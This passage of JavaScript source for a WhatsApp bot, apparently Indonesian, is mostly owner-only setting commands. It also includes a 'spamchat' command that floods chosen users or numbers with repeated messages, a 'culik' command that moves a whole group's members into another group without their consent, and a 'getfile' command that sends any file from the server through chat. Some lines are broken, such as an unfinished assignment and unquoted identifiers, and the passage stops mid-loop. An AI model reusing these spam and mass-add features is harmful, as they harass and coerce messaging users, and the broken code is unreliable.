case 'autobutton':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (args[0] === 'on' || args[0] === 'enable' || args[0] === '1') {
if (autobutton === true) return setReply('Udah aktif kak')
autobutton = true
setReply(`Mode ${command} telah aktif kak`)
} else if (args[0] === 'off' || args[0] === 'disable' || args[0] === '0') {
if (autobutton === false) return setReply('Udah off kak')
autobutton = false
let eh = 
setReply(`Mode ${command} telah di matikan`)
} else if (!q) {
Araa.sendButMessage(from,`MODE AUTO BUTTON`,`Silahkan pilih salah satu`,[
{ buttonId: `${prefix + command} on`, buttonText: { displayText: On }, type: 1 },
{ buttonId: `${prefix + command} off`, buttonText: { displayText: Off }, type: 1 },],setQuoted)
}
break    
case 'autoquoted':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (args[0] === 'true') {
if (autoquoted === true) return setReply('Udah aktif kak')
autoquoted = true
setReply(`Mode ${command} telah aktif kak`)
} else if (args[0] === 'false') {
if (autoquoted === false) return setReply('Udah off kak')
autoquoted = false
setReply(`Mode ${command} telah di matikan`)
} else if (!q) {
Araa.sendButMessage(from,`MODE AUTO QUOTED`,`Silahkan pilih salah satu`,[
{ buttonId: `${prefix + command} true`, buttonText: { displayText: On }, type: 1 },
{ buttonId: `${prefix + command} false`, buttonText: { displayText: Off }, type: 1 },],setQuoted)
}
break                
case 'culik':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isOwner && !itsMe) return onlyOwner()
if (args.length < 1) return reply('_*Masukin id grupnya tolol*_')
let mem = []
await groupMembers.map((i) => mem.push(i.id))
await Araa.groupParticipantsUpdate(q, mem, 'add')
setReply('Sukses')
}
break
case 'shutdown':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isOwner && !itsMe) return onlyOwner()
await Araa.sendMessage(from, { text: '_Shuting Down..._' })
await delay(3000)
await Araa.sendMessage(from, { text: '_Succes_' })
exec(`pm2 stop index.js`)
return await Araa.sendMessage(from, JSON.stringify(eval(process.exit())))
break
case 'restart':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isOwner && !itsMe) return onlyOwner()
await setReply(`_Restarting ${botName}_`)
try {
await Araa.sendMessage(from, { text: '_Succes_' })
await sleep(3000)
exec(`pm2 restart index.js`)
} catch (err) {
exec(`cd && node index`)
await sleep(4000)
setReply('Sukses')
}
break
case 'setprefix':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isOwner && !m.key.fromMe) return onlyOwner()
let teks = `SETTING PREFIX\n\nSilakan masukkan prefix\nOptions :\n=> multi\n=> nopref\n=> allpref`
if (q === 'multi') {
multi = true
nopref = false
setReply(`Berhasil mengubah prefix ke *「 ${q} 」*`)
} else if (q === 'nopref') {
multi = false
nopref = true
setReply(`Berhasil mengubah prefix ke *「 ${q} 」*`)
} else if (q === 'allpref') {
multi = false
nopref = false
allpref = true
setReply(`Berhasil mengubah prefix ke *「 ${q} 」*`)
} else if (!q) {
Araa.sendButMessage(from, teks, fake, [
{ buttonId: `${prefix}setprefix multi`, buttonText: { displayText: `ᴍᴜʟᴛɪ` }, type: 1 },
{ buttonId: `${prefix}setprefix nopref`, buttonText: { displayText: `ɴᴏᴘʀᴇғ` }, type: 1 },
{ buttonId: `${prefix}setprefix allpref`, buttonText: { displayText: `ᴀʟʟᴘʀᴇғ` }, type: 1 },
])
} else {
multi = false
nopref = false
prefa = `${q}`
setReply(`Berhasil anying mengubah prefix ke *「 ${q} 」*`)
}
}
break
case 'setmenu':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (args[0] === 'lokasi2' || args[0] === 'location2') {
if (setmenu === 'location2') return setReply('Udah aktif kak')
setmenu = 'location2'
await Araa.sendButMessage(from,`Berhasil mengubah tampilan menu ke ${q}`,`Silahkan pilih salah satu`,[
{ buttonId: `${prefix}profile`, buttonText: { displayText: `ᴘʀᴏғɪʟᴇ` }, type: 1 },
{ buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ` }, type: 1 },],setQuoted)
} else if (args[0] === 'image' || args[0] === 'img') {
if (setmenu === 'image') return setReply('Udah aktif kak')
setmenu = 'image'
await Araa.sendButMessage(from,`Berhasil mengubah tampilan menu ke ${q}`,`Silahkan pilih salah satu`,[
{ buttonId: `${prefix}profile`, buttonText: { displayText: `ᴘʀᴏғɪʟᴇ` }, type: 1 },
{ buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ` }, type: 1 },],setQuoted)
} else if (args[0] === 'lokasi' || args[0] === 'location') {
if (setmenu === 'location') return setReply('Udah aktif kak')
setmenu = 'location'
await Araa.sendButMessage(from,`Berhasil mengubah tampilan menu ke ${q}`,`Silahkan pilih salah satu`,[
{ buttonId: `${prefix}profile`, buttonText: { displayText: `ᴘʀᴏғɪʟᴇ` }, type: 1 },
{ buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ` }, type: 1 },],setQuoted)
} else if (args[0] === 'katalog') {
if (setmenu === 'katalog') return setReply('Udah aktif kak')
setmenu = 'katalog'
await Araa.sendButMessage(from,`Berhasil mengubah tampilan menu ke ${q}`,`Silahkan pilih salah satu`,[
{ buttonId: `${prefix}profile`, buttonText: { displayText: `ᴘʀᴏғɪʟᴇ` }, type: 1 },
{ buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ` }, type: 1 },],setQuoted)
} else if (args[0] === 'image2' || args[0] === 'img2') {
if (setmenu === 'image2') return setReply('Udah aktif kak')
setmenu = 'image2'
await Araa.sendButMessage(from,`Berhasil mengubah tampilan menu ke ${q}`,`Silahkan pilih salah satu`,[
{ buttonId: `${prefix}profile`, buttonText: { displayText: `ᴘʀᴏғɪʟᴇ` }, type: 1 },
{ buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ` }, type: 1 },],setQuoted)
} else if (args[0] === 'document') {
if (setmenu === 'document') return setReply('Udah aktif kak')
setmenu = 'document'
await Araa.sendButMessage(from,`Berhasil mengubah tampilan menu ke ${q}`,`Silahkan pilih salah satu`,[
{ buttonId: `${prefix}profile`, buttonText: { displayText: `ᴘʀᴏғɪʟᴇ` }, type: 1 },
{ buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ` }, type: 1 },],setQuoted)
} else if (args[0] === 'gif') {
if (setmenu === 'gif') return setReply('Udah aktif kak')
setmenu = 'gif'
await Araa.sendButMessage(from,`Berhasil mengubah tampilan menu ke ${q}`,`Silahkan pilih salah satu`,[
{ buttonId: `${prefix}profile`, buttonText: { displayText: `ᴘʀᴏғɪʟᴇ` }, type: 1 },
{ buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ` }, type: 1 },],setQuoted)
} else if (args[0] === 'buttonlist') {
if (setmenu === 'buttonlist') return setReply('Udah aktif kak')
setmenu = 'buttonlist'
await Araa.sendButMessage(from,`Berhasil mengubah tampilan menu ke ${q}`,`Silahkan pilih salah satu`,[
{ buttonId: `${prefix}profile`, buttonText: { displayText: `ᴘʀᴏғɪʟᴇ` }, type: 1 },
{ buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ` }, type: 1 },],setQuoted)
} else if (args[0] === 'video') {
if (setmenu === 'video') return setReply('Udah aktif kak')
setmenu = 'video'
await Araa.sendButMessage(from,`Berhasil mengubah tampilan menu ke ${q}`,`Silahkan pilih salah satu`,[
{ buttonId: `${prefix}profile`, buttonText: { displayText: `ᴘʀᴏғɪʟᴇ` }, type: 1 },
{ buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ` }, type: 1 },],setQuoted)
} else if (args[0] === 'gif2') {
if (setmenu === 'gif2') return setReply('Udah aktif kak')
setmenu = 'gif2'
await Araa.sendButMessage(from,`Berhasil mengubah tampilan menu ke ${q}`,`Silahkan pilih salah satu`,[
{ buttonId: `${prefix}profile`, buttonText: { displayText: `ᴘʀᴏғɪʟᴇ` }, type: 1 },
{ buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ` }, type: 1 },],setQuoted)
} else if (args[0] === 'video2') {
if (setmenu === 'video2') return setReply('Udah aktif kak')
setmenu = 'video2'
await Araa.sendButMessage(from,`Berhasil mengubah tampilan menu ke ${q}`,`Silahkan pilih salah satu`,[
{ buttonId: `${prefix}profile`, buttonText: { displayText: `ᴘʀᴏғɪʟᴇ` }, type: 1 },
{ buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ` }, type: 1 },],setQuoted)
} else if (!q) {
const sections = [ {
title: `SILAHKAN PILIH`,
rows: [
{title: `DOCUMENT`, rowId: `${prefix}setmenu document`},
{title: `LOCATION`, rowId: `${prefix}setmenu location`},
{title: `IMAGE`, rowId: `${prefix}setmenu image`},
{title: `GIF`, rowId: `${prefix}setmenu gif`},
{title: `VIDEO`, rowId: `${prefix}setmenu video`},
{title: `LOCATION 2`, rowId: `${prefix}setmenu location2`},
{title: `IMAGE 2`, rowId: `${prefix}setmenu image2`},
{title: `GIF 2`, rowId: `${prefix}setmenu gif2`},
{title: `VIDEO 2`, rowId: `${prefix}setmenu video2`},
{title: `KATALOG`, rowId: `${prefix}setmenu katalog`},
{title: `BUTTON LIST`, rowId: `${prefix}setmenu buttonlist`},
]}]
const listMessage = { text: `Name : ${pushname}\nNumber : ${sender.split('@')[0]}\nStatus : ${isOwner ? 'Owner' : 'User'}`, mentions: [sender], footer: fake, title: `Hai Kak @${sender.split('@')[0]}`, buttonText: "Click Here", sections }
Araa.sendMessage(from, listMessage, { quoted: setQuoted })                    
} else {
setReply('Menu tidak di temukan om')
}
break
case 'setreply':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (args[0] === 'web1' || args[0] === 'situs1') {
if (replyType === 'web1') return setReply('Udah aktif')
replyType = 'web1'
setReply(`Berhasil mengubah set reply ke ${q}`)
} else if (args[0] === 'web2' || args[0] === 'situs2') {
if (replyType === 'web2') return setReply('Udah aktif')
replyType = 'web2'
setReply(`Berhasil mengubah set reply ke ${q}`)
} else if (args[0] === 'web3' || args[0] === 'situs3') {
if (replyType === 'web3') return setReply('Udah aktif')
replyType = 'web3'
setReply(`Berhasil mengubah set reply ke ${q}`)
} else if (args[0] === 'mess') {
if (replyType === 'mess') return setReply('Udah aktif')
replyType = 'mess'
setReply(`Berhasil mengubah set reply ke ${q}`)
} else if (args[0] === 'troli') {
if (replyType === 'troli') return setReply('Udah aktif')
replyType = 'troli'
setReply(`Berhasil mengubah set reply ke ${q}`)
} else if (args[0] === 'troli2') {
if (replyType === 'troli2') return setReply('Udah aktif')
replyType = 'troli2'
setReply(`Berhasil mengubah set reply ke ${q}`)
} else if (!q) {
Araa.sendButMessage(from, `SETTING REPLY\n1. web1\n2. web2\n3. web3\n4. mess\n5. troli\n6. troli2`, `Silahkan pilih salah satu`, [
{ buttonId: `${prefix}setreply web1`, buttonText: { displayText: `WEB1` }, type: 1 },
{ buttonId: `${prefix}setreply web2`, buttonText: { displayText: `WEB2` }, type: 1 },
{ buttonId: `${prefix}setreply web3`, buttonText: { displayText: `WEB3` }, type: 1 },
])
} else {
setReply('Set Reply Tidak Di Temukan')
}
}
break
case 'setquoted':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (args[0] === 'ftoko' || args[0] === 'product') {
if (Qoted === 'ftoko') return setReply('Udah aktif')
Qoted = 'ftoko'
await Araa.sendMessage(from, { text: `Berhasil mengubah quoted ke ${q}` }, { quoted: ftoko })
} else if (args[0] === 'fkontak') {
if (Qoted === 'fkontak') return setReply('Udah aktif')
Qoted = 'fkontak'
await Araa.sendMessage(from, { text: `Berhasil mengubah quoted ke ${q}` }, { quoted: fkontak })
} else if (args[0] === 'ftext') {
if (Qoted === 'ftext') return setReply('Udah aktif')
Qoted = 'ftext'
await Araa.sendMessage(from, { text: `Berhasil mengubah quoted ke ${q}` }, { quoted: ftext })
} else if (args[0] === 'ftroli') {
if (Qoted === 'ftroli') return setReply('Udah aktif')
Qoted = 'ftroli'
await Araa.sendMessage(from, { text: `Berhasil mengubah quoted ke ${q}` }, { quoted: ftroli })
} else if (args[0] === 'floc') {
if (Qoted === 'floc') return setReply('Udah aktif')
Qoted = 'floc'
await Araa.sendMessage(from, { text: `Berhasil mengubah quoted ke ${q}` }, { quoted: floc })
} else if (args[0] === 'fimage') {
if (Qoted === 'fimage') return setReply('Udah aktif')
Qoted = 'fimage'
await Araa.sendMessage(from, { text: `Berhasil mengubah quoted ke ${q}` }, { quoted: fimage })
} else if (args[0] === 'fdoc') {
if (Qoted === 'fdoc') return setReply('Udah aktif')
Qoted = 'fdoc'
await Araa.sendMessage(from, { text: `Berhasil mengubah quoted ke ${q}` }, { quoted: fdoc })
} else if (args[0] === 'fvid') {
if (Qoted === 'fvid') return setReply('Udah aktif')
Qoted = 'fvid'
await Araa.sendMessage(from, { text: `Berhasil mengubah quoted ke ${q}` }, { quoted: fvid })
} else if (args[0] === 'fgc') {
if (Qoted === 'fgc') return setReply('Udah aktif')
Qoted = 'fgc'
await Araa.sendMessage(from, { text: `Berhasil mengubah quoted ke ${q}` }, { quoted: fgc })
} else if (args[0] === 'fgif') {
if (Qoted === 'fgif') return setReply('Udah aktif')
Qoted = 'fgif'
await Araa.sendMessage(from, { text: `Berhasil mengubah quoted ke ${q}` }, { quoted: fgif })
} else if (args[0] === 'fvn') {
if (Qoted === 'fvn') return setReply('Udah aktif')
Qoted = 'fvn'
await Araa.sendMessage(from, { text: `Berhasil mengubah quoted ke ${q}` }, { quoted: fvn })
} else if (args[0] === 'm') {
if (Qoted === 'm') return setReply('Udah aktif')
Qoted = 'm'
await Araa.sendMessage(from, { text: `Berhasil mengubah quoted ke ${q}` }, { quoted: m })
} else if (!q) {
Araa.sendButMessage(from,`SETTING QUOTED`,`Silahkan pilih salah satu`,[
{ buttonId: `${prefix}setquoted ftoko`, buttonText: { displayText: `ғᴛᴏᴋᴏ` }, type: 1 },
{ buttonId: `${prefix}setquoted fkontak`, buttonText: { displayText: `ғᴋᴏɴᴛᴀᴋ` }, type: 1 },
{ buttonId: `${prefix}setquoted ftext`, buttonText: { displayText: `ғᴛᴇxᴛ` }, type: 1 },],setQuoted)
} else {
let teks = `Quoted yang kamu masukan salah\nSilakan pilih salah satu quoted berikut:\n1.ftoko\n2.fkontak\n3.ftext\n4.ftroli\n5.floc\n6.fimage\n7.fdoc\n8.fvid\n9.fgc\n10.fgif\n11.fvn\n12.m`
setReply(teks)
}
break
case 'setnamebot':
case 'setnamabot':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isOwner && !m.key.fromMe) return onlyOwner()
setReply(`Berhasil mengubah nama bot ke ${q}`)
botName = `${q}`
break
case 'setppbot':
try {
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (isImage && !args[0] || isQuotedImage && !args[0]) {
var media = await Araa.downloadAndSaveMediaMessage(quoted)
var data = await Araa.updateProfilePicture(botNumber, { url: media })
fs.unlinkSync(media)
setReply(`Sukses`)
} else if (isImage && args[0] === 'full' || isQuotedImage && args[0] === 'full') {
var { img } = await generateProfilePicture(media)
await Araa.query({ tag: 'iq',attrs: { to: botNumber, type:'set', xmlns: 'w:profile:picture'}, content: [{ tag: 'picture', attrs: { type: 'image' }, content: img }]})
setReply(`Sukses`)
} else {
setReply(`Kirim/balas gambar dengan caption ${prefix + command} untuk mengubah foto profil bot`)
}
} catch (err) {
console.log(err)
setReply(`Gagal mengganti pp bot`)
}
break
case 'setbio':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isOwner && !itsMe) return setReply('Khusus Owner')
if (!q) return setReply(`Kirim perintah ${prefix + command} nama\n\nContoh : ${command} Paijo`)
await Araa.setStatus(q)
await setReply(`Berhasil mengganti status bio ke *${q}*`)
}
break
case 'setgif':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (isVideo || isQuotedVideo) {
let delb = await Araa.downloadAndSaveMediaMessage(quoted)
await fse.copy(delb, `./media/video/video.mp4`)
fs.unlinkSync(delb)
setReply(`Berhasil mengubah thumbnail`)
} else {
setReply(`Kirim gambar dengan caption ${prefix}setgif`)
}
}
break
case 'setexif':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isOwner && !m.key.fromMe) return onlyOwner()
var namaPack = q.split('|')[0] ? q.split('|')[0] : q
var authorPack = q.split('|')[1] ? q.split('|')[1] : ''
exif.create(namaPack, authorPack)
setReply(`Sukses membuat exif`)
break
case 'console':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (args[0] === 'on' || args[0] === 'enable' || args[0] === '1') {
if (Console === true) return setReply('Udah aktif kak')
Console = true
setReply(`Tampilan ${command} telah di aktifkan`)
} else if (args[0] === 'off' || args[0] === 'disable' || args[0] === '0') {
if (Console === false) return setReply('Udah off kak')
Console = false
setReply(`Tampilan ${command} telah di matikan`)
} else if (!q) {
Araa.sendButMessage(from,`MODE AUTOREAD`,`Silahkan pilih salah satu`,[
{ buttonId: `${prefix}console on`, buttonText: { displayText: On }, type: 1 },
{ buttonId: `${prefix}console off`, buttonText: { displayText: Off }, type: 1 },],setQuoted)
}
break
case 'public':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (publik) return setReply('Udah di mode publick kak')
publik = true
setReply(`Mode public aktif kak`)
break
case 'self':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (publik == false) return setReply('Udah di mode self kak')
publik = false
setReply(`Mode self aktif kak`)
break
case 'setwelcome':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (args[0] === 'type1') {
if (setwelcome === 'type1') return setReply('Udah aktif')
setwelcome = 'type1'
setReply(`Berhasil mengubah welcome ke 「 ${q} 」`)
} else if (args[0] === 'type2') {
if (setwelcome === 'type2') return setReply('Udah aktif')
setwelcome = 'type2'
setReply(`Berhasil mengubah welcome ke 「 ${q} 」`)
} else if (args[0] === 'type3') {
if (setwelcome === 'type3') return setReply('Udah aktif')
setwelcome = 'type3'
setReply(`Berhasil mengubah welcome ke 「 ${q} 」`)
} else if (!q) {
Araa.sendButMessage(from,`SETTING WELCOME`,`Silahkan pilih salah satu`,[
{ buttonId: `${prefix}setwelcome type1`, buttonText: { displayText: `Type1` }, type: 1 },
{ buttonId: `${prefix}setwelcome type2`, buttonText: { displayText: `Type2` }, type: 1 },
{ buttonId: `${prefix}setwelcome type3`, buttonText: { displayText: `Type3` }, type: 1 },],setQuoted)
} else {
let teks = `Query tidak diremukan\nSilakan pilih salah satu:\n1.type1\n2.type2\n3.type3`
setReply(teks)
}
break
case 'setdocument':
case 'setdoc':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (args[0] === 'zip') {
if (docType === 'zip') return setReply('Udah aktif')
docType = 'zip'
setReply(`Berhasil mengubah docmunet ke 「 ${q} 」`)
} else if (args[0] === 'pdf') {
if (docType === 'pdf') return setReply('Udah aktif')
docType = 'pdf'
setReply(`Berhasil mengubah docmunet ke 「 ${q} 」`)
} else if (args[0] === 'pptx') {
if (docType === 'pptx') return setReply('Udah aktif')
docType = 'pptx'
setReply(`Berhasil mengubah docmunet ke 「 ${q} 」`)
} else if (args[0] === 'xlsx') {
if (docType === 'xlsx') return setReply('Udah aktif')
docType = 'xlsx'
setReply(`Berhasil mengubah docmunet ke 「 ${q} 」`)
} else if (args[0] === 'docx') {
if (docType === 'docx') return setReply('Udah aktif')
docType = 'docx'
setReply(`Berhasil mengubah docmunet ke 「 ${q} 」`)
} else if (!q) {
Araa.sendButMessage(from,`SETTING DOCUMENT`,`Silahkan pilih salah satu`,[
{ buttonId: `${prefix}setdocument pdf`, buttonText: { displayText: `Pdf` }, type: 1 },
{ buttonId: `${prefix}setdocument xlsx`, buttonText: { displayText: `Xlsx` }, type: 1 },
{ buttonId: `${prefix}setdocument pptx`, buttonText: { displayText: `Pptx` }, type: 1 },],setQuoted)
} else {
let teks = `Document tidak diremukan\nSilakan pilih salah satu:\n1.zip\n2.pdf\n3.pptx\n4.xlsx\n5.docx`
setReply(teks)
}
break
case 'setfake':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (!q) return reply(`Teks?`)
if (args[0] === `${q}`) {
fake = `${q}`
setReply(`Berhasil mengubah text fake ke 「 ${q} 」`)
}
break
case 'settextreply':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (!q) return reply(`Teks?`)
if (args[0] === `${q}`) {
textreply = `${q}`
setReply(`Berhasil mengubah text reply ke 「 ${q} 」`)
}
break
case 'setnamaowner':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (!q) return reply(`Teks?`)
if (args[0] === `${q}`) {
ownerName = `${q}`
setReply(`Berhasil mengubah nama owner ke 「 ${q} 」`)
}
break
case 'setnomerowner':
case 'setnoowner':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (!q) return reply(`Nomernya?`)
if (args[0].startsWith('08')) return setReply('Gunakan kode negara kak')
if (args[0] === `${q}`) {
nomerOwner = `${q}`
setReply(`Berhasil mengubah nomer owner ke 「 ${q} 」`)
}
break
case 'setlang':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isOwner && !m.key.fromMe) return onlyOwner()
try {
let translate = require('translate-google-api')
let tld = 'cn'
let result = await translate(`${text}`, { tld, to: q })
language = q
setReply(`Berhasil mengubah bahasa ke ${q}`)
} catch (err) {
setReply('Daftar bahasa yang didukung: https://cloud.google.com/translate/docs/languages')
}
break
case 'setimgdoc':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (isImage || isQuotedImage) {
let delb = await Araa.downloadAndSaveMediaMessage(quoted)
await fse.copy(delb, `./media/image/thumbnaildokumen.jpg`)
fs.unlinkSync(delb)
setReply(`Berhasil mengubah image doc`)
} else {
setReply(`Kirim gambar dengan caption ${prefix + command}`)
}
}
break
case 'setimgreply':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (isImage || isQuotedImage) {
let delb = await Araa.downloadAndSaveMediaMessage(quoted)
await fse.copy(delb, `./media/image/reply.jpg`)
fs.unlinkSync(delb)
setReply(`Berhasil mengubah image reply`)
} else {
setReply(`Kirim gambar dengan caption ${prefix}setimagereply`)
}
}
break
case 'setfakegif':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (isImage || isQuotedImage) {
let delb = await Araa.downloadAndSaveMediaMessage(quoted)
await fse.copy(delb, `./media/image/fake gif.jpeg`)
fs.unlinkSync(delb)
setReply(`Berhasil mengubah fake gif`)
} else {
setReply(`Kirim gambar dengan caption ${prefix + command}`)
}
}
break
case 'getfile':
try {
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (!q) return setReply(`Penggunaan:\n${prefix + command} ./index.js`)
if (q.split('/')[1] && q.split('/')[2] && q.split('/')[3] && q.split('/')[4] && q.split('/')[5] && q.split('/')[6] && q.split('/')[7] && q.split('/')[8] && q.split('/')[9] && q.split('/')[10]) {
await setReply(`Send File...`)
const file = await fs.readFileSync(`${q}`)
await Araa.sendMessage(from, { document: file, mimetype: 'application/bin', fileName: `${q.split('/')[10]}` }, { quoted: m })
} else if (q.split('/')[1] && q.split('/')[2] && q.split('/')[3] && q.split('/')[4] && q.split('/')[5] && q.split('/')[6] && q.split('/')[7] && q.split('/')[8] && q.split('/')[9] && !q.split('/')[10]) {
await setReply(`Send File...`)
const file = await fs.readFileSync(`${q}`)
await Araa.sendMessage(from, { document: file, mimetype: 'application/bin', fileName: `${q.split('/')[9]}` }, { quoted: m })                        
} else if (q.split('/')[1] && q.split('/')[2] && q.split('/')[3] && q.split('/')[4] && q.split('/')[5] && q.split('/')[6] && q.split('/')[7] && q.split('/')[8] && !q.split('/')[9] && !q.split('/')[10]) {
await setReply(`Send File...`)
const file = await fs.readFileSync(`${q}`)
await Araa.sendMessage(from, { document: file, mimetype: 'application/bin', fileName: `${q.split('/')[8]}` }, { quoted: m })                                                                                                
} else if (q.split('/')[1] && q.split('/')[2] && q.split('/')[3] && q.split('/')[4] && q.split('/')[5] && q.split('/')[6] && q.split('/')[7] && !q.split('/')[8] && !q.split('/')[9] && !q.split('/')[10]) {
await setReply(`Send File...`)
const file = await fs.readFileSync(`${q}`)
await Araa.sendMessage(from, { document: file, mimetype: 'application/bin', fileName: `${q.split('/')[7]}` }, { quoted: m })
} else if (q.split('/')[1] && q.split('/')[2] && q.split('/')[3] && q.split('/')[4] && q.split('/')[5] && q.split('/')[6] && !q.split('/')[7] && !q.split('/')[8] && !q.split('/')[9] && !q.split('/')[10]) {
await setReply(`Send File...`)
const file = await fs.readFileSync(`${q}`)
await Araa.sendMessage(from, { document: file, mimetype: 'application/bin', fileName: `${q.split('/')[6]}` }, { quoted: m })
} else if (q.split('/')[1] && q.split('/')[2] && q.split('/')[3] && q.split('/')[4] && q.split('/')[5] && !q.split('/')[6] && !q.split('/')[7] && !q.split('/')[8] && !q.split('/')[9] && !q.split('/')[10]) {
await setReply(`Send File...`)
const file = await fs.readFileSync(`${q}`)
await Araa.sendMessage(from, { document: file, mimetype: 'application/bin', fileName: `${q.split('/')[5]}` }, { quoted: m })
} else if (q.split('/')[1] && q.split('/')[2] && q.split('/')[3] && q.split('/')[4] && !q.split('/')[5] && !q.split('/')[6] && !q.split('/')[7] && !q.split('/')[8] && !q.split('/')[9] && !q.split('/')[10]) {
await setReply(`Send File...`)
const file = await fs.readFileSync(`${q}`)
await Araa.sendMessage(from, { document: file, mimetype: 'application/bin', fileName: `${q.split('/')[4]}` }, { quoted: m })
} else if (q.split('/')[1] && q.split('/')[2] && q.split('/')[3] && !q.split('/')[4] && !q.split('/')[5] && !q.split('/')[6] && !q.split('/')[7] && !q.split('/')[8] && !q.split('/')[9] && !q.split('/')[10]) {
await setReply(`Send File...`)
const file = await fs.readFileSync(`${q}`)
await Araa.sendMessage(from, { document: file, mimetype: 'application/bin', fileName: `${q.split('/')[3]}` }, { quoted: m })
} else if (q.split('/')[1] && q.split('/')[2] && !q.split('/')[3] && !q.split('/')[4] && !q.split('/')[5] && !q.split('/')[6] && !q.split('/')[7] && !q.split('/')[8] && !q.split('/')[9] && !q.split('/')[10]) {
await setReply(`Send File...`)
const file = await fs.readFileSync(`${q}`)
await Araa.sendMessage(from, { document: file, mimetype: 'application/bin', fileName: `${q.split('/')[2]}` }, { quoted: m })
} else if (q.split('/')[1] && !q.split('/')[2] && !q.split('/')[3] && !q.split('/')[4] && !q.split('/')[5] && !q.split('/')[6] && !q.split('/')[7] && !q.split('/')[8] && !q.split('/')[9] && !q.split('/')[10]) {
await setReply(`Send File...`)
const file = await fs.readFileSync(`${q}`)
await Araa.sendMessage(from, { document: file, mimetype: 'application/bin', fileName: `${q.split('/')[1]}` }, { quoted: m })
}
} catch (err) {
console.log(err)
setReply(`${err}`)
}
break
case 'spamchat':
try {
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isOwner && !m.key.fromMe) return onlyOwner()
var nomor = q.split('|')[0].replace(new RegExp('[()+-/ +/]', 'gi'), '')
if (from && !mentionByReply && !mentionByTag[0] && !q.split('|')[1]) {
let teks = `${args[1]}`
if (!args[0]) return setReply('jumlah?')
if (isNaN(args[0])) return setReply(`Harus berupa angka`)
if (!args[1]) return setReply('teks')
for (let i = 0; i < args[0]; i++) {
Araa.sendMessage(from, { text: teks })
}
setReply(`Berhasil spam chat\nId : ${from.split('@')[0]}\nJumlah : ${args[0]}\nPesan : ${teks}`)
} else if (mentionByReply) {
let teks = `${args[1]}`
if (!args[0]) return setReply('jumlah')
if (isNaN(args[0])) return setReply(`Harus berupa angka`)
if (!args[1]) return setReply('teks')
for (let i = 0; i < args[0]; i++) {
Araa.sendMessage(mentionByReply, { text: teks })
}
setReply(`Berhasil spam chat\nId : ${mentionByReply.split('@')[0]}\nJumlah : ${args[0]}\nPesan : ${teks}`)
} else if (mentionByTag[0] && isGroup) {
let teks = `${args[2]}`
if (!args[1]) return setReply('jumlah?')
if (isNaN(args[1])) return setReply(`Harus berupa angka`)
if (!args[2]) return setReply('teks')
for (let i = 0; i < args[1]; i++) {
Araa.sendMessage(mentionByTag[0], { text: teks })
}
setReply(`Berhasil spam chat\nId : ${mentionByTag[0].split('@')[0]}\nJumlah : ${args[1]}\nPesan : ${teks}`)
} else if (nomor) {
let teks = `${q.split('|')[2]}`
if (!q.split('|')[1]) return setReply('jumlah?')
if (isNaN(q.split('|')[1])) return setReply(`Harus berupa angka`)
if (!q.split('|')[2]) return setReply('teks')
for (let i = 0; i < q.split('|')[1]; i++) {
